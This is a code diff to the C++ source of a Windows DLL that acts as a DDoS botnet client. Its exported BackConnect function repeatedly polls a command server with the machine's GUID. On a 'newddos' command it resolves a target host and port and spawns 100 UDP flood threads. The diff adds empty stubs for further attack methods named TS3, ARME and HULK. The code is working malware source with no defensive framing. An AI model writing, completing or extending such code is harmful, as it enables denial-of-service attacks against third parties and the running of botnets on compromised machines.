@@ -12,6 +12,7 @@
 #include <WinSock2.h>
 #pragma comment(lib,"ws2_32.lib")
 #define MAX_PACKET_SIZE 4096
+#define RND_CHAR (char)((rand() % 26)+97)
 
 extern "C"
 {
@@ -20,12 +21,11 @@ extern "C"
 	bool stopTask = false;
 	std::string globalTaskIDRunning = "0";
 	std::string maxtime;
+
 	void split(const std::string& str, const std::string& delimiter, std::vector<std::string>& arr) {
 				
 		int strleng = str.length();
 		int delleng = delimiter.length();
-		//if (delleng == 0)
-			//return arr;//no change
 		int i = 0;
 		int k = 0;
 		while (i < strleng)
@@ -33,7 +33,7 @@ extern "C"
 			int j = 0;
 			while (i + j < strleng && j < delleng && str[i + j] == delimiter[j])
 				j++;
-			if (j == delleng)//found delimiter
+			if (j == delleng) //found delimiter
 			{
 				arr.push_back(str.substr(k, i - k));
 				i += delleng;
@@ -44,7 +44,6 @@ extern "C"
 			}
 		}
 		arr.push_back(str.substr(k, i - k));
-		//return arr;
 	}
 
 	static std::string GetMachineGUID()
@@ -165,24 +164,29 @@ extern "C"
 		}
 	}
 		
+	DWORD WINAPI TS3Thread(PVOID p)
+	{
+
+	}	
+	
+	DWORD WINAPI ARMEThread(PVOID p)
+	{
+
+	}
+
+	DWORD WINAPI HULKThread(PVOID p)
+	{
+
+	}
+
 	__declspec(dllexport) void BackConnect(std::string url)
 	{
 		int n = 20;
 		std::thread hThread;
 		std::vector<HANDLE> threads(100);
-
-
-
 		while (true) {
-			//std::cout << "Waiting \n";
-
 			std::string post = "hwid=" + GetMachineGUID() + "&taskrunning=" + std::to_string(task1_running) + "&taskid=" + globalTaskIDRunning;
-
-			//std::cout << url;
 			std::string response = postRequest(url, post);
-
-
-
 
 			if (response.find("newddos") != std::string::npos) {
 				std::vector<std::string> v;
@@ -195,7 +199,6 @@ extern "C"
 				std::string port = v[4];
 				maxtime = v[5];
 
-				//std::istringstream iss
 				globalTaskIDRunning = taskid;
 
 				if (!task1_running) {
@@ -211,9 +214,8 @@ extern "C"
 					if (WSAStartup(0x202, &wd))
 					{
 						printf("\nError: Unable to initialize Winsock\n");
-
+						break;
 					}
-
 
 					char* hostHelper;
 					char* pathHelper;
@@ -222,16 +224,13 @@ extern "C"
 					hostHelper = (char*)u.domain.c_str();
 					pathHelper = (char*)u.path.c_str();
 					host = gethostbyname(hostHelper);
-					if (!host)
-					{
-						return;
+					if (!host) {
+						break;
 					}
 
 					sai.sin_family = AF_INET;
 					sai.sin_addr.S_un.S_addr = *(PULONG)host->h_addr;
 					sai.sin_port = htons(strtoul(port.c_str(), NULL, 0));
-
-					//printf("\nCreating 1000 threads for attack...\n");
 
 					for (i = 0; i < 100; i++)
 					{
@@ -245,7 +244,6 @@ extern "C"
 							threads[i] = CreateThread(NULL, 0, UDPThread, &sai, 0, NULL);
 						}
 					}
-
 				}
 			}
 			else if (response == "kill") {
@@ -262,8 +260,6 @@ extern "C"
 				break;
 				return;
 			}
-
-
 			Sleep(2500);
 		}
 		return;
